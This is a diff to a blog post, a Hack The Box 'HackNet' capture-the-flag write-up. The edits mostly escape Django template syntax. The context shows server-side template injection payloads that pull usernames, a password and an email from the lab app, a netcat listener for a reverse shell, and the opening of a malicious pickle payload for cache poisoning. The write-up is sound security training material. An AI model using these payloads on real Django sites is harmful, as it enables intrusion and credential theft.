@@ -2,7 +2,7 @@
 layout: post
 title:  "Hack The Box Hacknet Write-up"
 category : Writeup
-tags: django, ssti, template-injection, pickle-deserialization, cache-poisoning, gpg-cracking,
+tags: [django, ssti, template-injection, pickle-deserialization, cache-poisoning, gpg-cracking]
 ---
 
 # HackNet - HackTheBox Writeup
@@ -95,29 +95,29 @@ Something strange appeared in the title field corresponding to my username - the
 ![Username Field Anomaly](../assets/blog/HTB-Hacknet/image2.png)
 
 ### SSTI Discovery Process
-I realized that the SSTI payload `{ %debug% }` was actually being rendered (but showing nothing visible). Since that field renders the username from Django, I tested again by changing my username to `{{users}}` and made a request to see the likes.
+I realized that the SSTI payload {% raw %}`{% debug %}`{% endraw %} was actually being rendered (but showing nothing visible). Since that field renders the username from Django, I tested again by changing my username to {% raw %}`{{users}}`{% endraw %} and made a request to see the likes.
 
 **Bingo!** The template was processed:
 
 ```html
-</div><div class="likes-review-item"><a href="/profile/28"><img src="/media/PNG_transparency_demonstration_1.png" title="&lt;QuerySet [&lt;SocialUser: cyberghost&gt;, &lt;SocialUser: rootbreaker&gt;, &lt;SocialUser: zero_day&gt;, &lt;SocialUser: cryptoraven&gt;, &lt;SocialUser: bytebandit&gt;, &lt;SocialUser: datadive&gt;, &lt;SocialUser: phreaker&gt;, &lt;SocialUser: netninja&gt;, &lt;SocialUser: darkseeker&gt;, &lt;SocialUser: trojanhorse&gt;, &lt;SocialUser: exploit_wizard&gt;, &lt;SocialUser: whitehat&gt;, &lt;SocialUser: virus_viper&gt;, &lt;SocialUser: brute_force&gt;, &lt;SocialUser: {{users}}&gt;]&gt;"></a></div>
+{% raw %}</div><div class="likes-review-item"><a href="/profile/28"><img src="/media/PNG_transparency_demonstration_1.png" title="&lt;QuerySet [&lt;SocialUser: cyberghost&gt;, &lt;SocialUser: rootbreaker&gt;, &lt;SocialUser: zero_day&gt;, &lt;SocialUser: cryptoraven&gt;, &lt;SocialUser: bytebandit&gt;, &lt;SocialUser: datadive&gt;, &lt;SocialUser: phreaker&gt;, &lt;SocialUser: netninja&gt;, &lt;SocialUser: darkseeker&gt;, &lt;SocialUser: trojanhorse&gt;, &lt;SocialUser: exploit_wizard&gt;, &lt;SocialUser: whitehat&gt;, &lt;SocialUser: virus_viper&gt;, &lt;SocialUser: brute_force&gt;, &lt;SocialUser: {{users}}&gt;]&gt;"></a></div>{% endraw %}
 ```
 
 ### Credential Extraction via SSTI
-This showed registered usernames, but we needed passwords. Continuing testing on user posts, I found post ID 23 (a private post) (IDOR vuln) and tested `{{users.0.password}}`:
+This showed registered usernames, but we needed passwords. Continuing testing on user posts, I found post ID 23 (a private post) (IDOR vuln) and tested {% raw %}`{{users.0.password}}`{% endraw %}:
 
 ```html
-<div class="likes-review-item"><a href="/profile/28"><img src="/media/PNG_transparency_demonstration_1.png" title="test mYd4rks1dEisH3re"></a></div>
+{% raw %}<div class="likes-review-item"><a href="/profile/28"><img src="/media/PNG_transparency_demonstration_1.png" title="test mYd4rks1dEisH3re"></a></div>{% endraw %}
 ```
 
-We got a potential password! To identify the user, assuming `{{users.0.password}}` gives the password of user with index 0, I used `{{users.0.email}}`:
+We got a potential password! To identify the user, assuming {% raw %}`{{users.0.password}}`{% endraw %} gives the password of user with index 0, I used {% raw %}`{{users.0.email}}`{% endraw %}:
 
 ```html
-<div class="likes-review-item">
+{% raw %}<div class="likes-review-item">
         <a href="/profile/28">
         <img src="/media/PNG_transparency_demonstration_1.png" title="test mikey@hacknet.htb">
         </a>
-</div>
+</div>{% endraw %}
 ```
 
 **Credentials discovered:**
@@ -180,7 +180,7 @@ Django's FileBasedCache stores serialized Python objects using the pickle module
 nc -lvnp 4444
 ```
 
-**Step 2: Generate malicious pickle payload** AI useful thanks Claude AI 
+**Step 2: Generate malicious pickle payload**
 ```python
 #!/usr/bin/env python3
 import os
@@ -333,4 +333,3 @@ cat /root/root.txt
 - Python (Custom exploit development)
 - john (Password cracking)
 - GPG (Key management and decryption)
-
